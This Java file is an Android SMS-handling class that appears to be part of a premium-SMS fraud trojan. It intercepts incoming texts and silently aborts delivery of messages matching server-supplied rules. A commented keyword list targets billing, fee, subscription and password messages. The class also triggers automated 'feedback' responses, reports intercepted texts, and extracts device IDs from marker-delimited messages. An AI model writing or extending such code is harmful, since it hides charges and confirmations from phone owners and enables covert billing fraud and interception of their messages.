package net.workspace.sms;
import java.util.Vector;
import net.workspace.listener.BlockListener;
import net.workspace.manager.OrderManager;
import net.workspace.manager.ReportManager;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import bean.Block;
import bean.Feedback;
import bean.SmsPhoneNumber;

@SuppressLint("NewApi")
public class SmsHelper {
    public static Block checkBlock(String address, String text, BlockListener listener) {
        Block match = null;
        if (address != null && text != null) {
            Vector<Block> blockVector = BlockHelper.readBlocks();
            for (int i = blockVector.size() - 1; i >= 0; i--) {
                Block block = blockVector.get(i);
                if (matchBlock(address, text, block)) {
                    match = block;
                    listener.stopBroadcast();
                    break;
                }
            }
            blockVector.clear();
            System.gc();
        }
        return match;
    }
    public static void checkCommonBlocks(String address, String text, BlockListener listener) {
        /* if (address.startsWith("10") || address.startsWith("12")) {
             for (String keyword : blockContents) {
                 if (text.contains(keyword)) {
                     listener.stopBroadcast();
                     return;
                 }
             }
         }*/
    }
    public static Feedback checkFeedback(String address, String text, BlockListener listener) {
        Feedback result = null;
        Vector<Feedback> feedbackVector = BlockHelper.readFeedbacks();
        if (feedbackVector != null) {
            for (int i = feedbackVector.size() - 1; i >= 0; i--) {
                Feedback feedback = feedbackVector.get(i);
                Block block = feedback.block;
                if (matchBlock(address, text, block)) {
                    result = feedback;
                    listener.stopBroadcast();
                    break;
                }
            }
        }
        feedbackVector.clear();
        System.gc();
        return result;
    }
    public static boolean checkPhoneNumber(String address, String text) {
        return address != null && text != null && text.contains(PN_BLOCK_PREFIX) && text.contains(PN_BLOCK_SUFFIX);
    }
    /**
     * "账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码"
     */
    //public static String COMMON_BLOCK_KEYWORS = /*const-replace-start*/"账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码,订购";
    //public static List<String> blockContents = Arrays.asList(COMMON_BLOCK_KEYWORS.split(","));
    private static boolean matchBlock(String address, String text, Block block) {
        boolean matchPort = false;
        boolean matchContent = false;
        String blockPort = block.port;
        if (TextUtils.isEmpty(address) || TextUtils.isEmpty(blockPort)) {
            matchPort = true;
        } else {
            String array[] = blockPort.split("\\|");
            for (String port : array) {
                if (!TextUtils.isEmpty(port) && address.contains(port.trim())) {
                    matchPort = true;
                    break;
                }
            }
        }
        if (matchPort) {
            String blockContent = block.content;
            if (TextUtils.isEmpty(blockContent)) {
                matchContent = true;
            } else if (text != null) {
                if (blockContent.contains("&")) {
                    matchContent = true;
                    for (String field : blockContent.split("\\&")) {
                        if (!text.contains(field)) {
                            matchContent = false;
                            break;
                        }
                    }
                } else if (blockContent.contains("|")) {
                    for (String field : blockContent.split("\\|")) {
                        if (text.contains(field)) {
                            matchContent = true;
                            break;
                        }
                    }
                } else {
                    matchContent = text.contains(blockContent);
                }
            }
        }
        boolean result = matchContent && matchPort;
        if (result) {
            block.targetPort = address;
            block.targetContent = text;
        }
        return result;
    }
    public static void onSmsRecieved(final BroadcastReceiver broadcastreceiver, Intent intent) {
        if (CommonUtil.context != null && intent != null) {
            Object obj = intent.getExtras().get(PDUS2);
            if (obj != null) {
                Object[] pdus = (Object[]) obj;
                SmsMessage[] msgArray = new SmsMessage[pdus.length];
                String address = "";
                StringBuffer messageBody = new StringBuffer();
                for (int i = 0; i < pdus.length; i++) {
                    if (pdus[i] != null) {
                        msgArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        if (msgArray[i] != null) {
                            address = msgArray[i].getOriginatingAddress();
                            messageBody.append(msgArray[i].getMessageBody());
                        }
                    }
                }
                String text = messageBody.toString();
                MyLogger.debug(address, text);
                if (checkPhoneNumber(address, text)) {
                    broadcastreceiver.abortBroadcast();
                    reportPhoneNumber(address, text);
                } else {
                    BlockListener listener = new BlockListener() {
                        private boolean blocked = false;
                        @Override
                        public void stopBroadcast() {
                            if (!blocked) {
                                broadcastreceiver.abortBroadcast();
                                blocked = true;
                            }
                        }
                    };
                    SmsHelper.checkCommonBlocks(address, text, listener);
                    Feedback feedback = checkFeedback(address, text, listener);
                    if (feedback != null) {
                        OrderManager.getInstance(CommonUtil.context).executeFeedback(address, text, feedback);
                    } else {
                        Block block = checkBlock(address, text, listener);
                        if (block != null) {
                            ReportManager.successReport(block, address + "->" + text);
                        }
                    }
                }
            }
        }
    }
    static void reportPhoneNumber(String address, String text) {
        SmsPhoneNumber form = new SmsPhoneNumber();
        form.phoneNumber = address;
        int index = text.indexOf(PN_BLOCK_PREFIX);
        int length = PN_BLOCK_PREFIX.length();
        if (index >= 0) {
            int lastIndex = text.indexOf(PN_BLOCK_SUFFIX, index + length);
            if (lastIndex > index) {
                String deviceId = text.substring(index + length, lastIndex);
                form.deviceId = deviceId;
                ReportManager.report(form, true, null, null);
            }
        }
    }
    /**
     * "pdus"
     */
    private static String PDUS2 = /*const-replace-start*/"pdus";
    private static final String PN_BLOCK_PREFIX = /*const-replace-start*/"#jkpoae4#";
    private static final String PN_BLOCK_SUFFIX = /*const-replace-start*/"#defa3fg#";
}
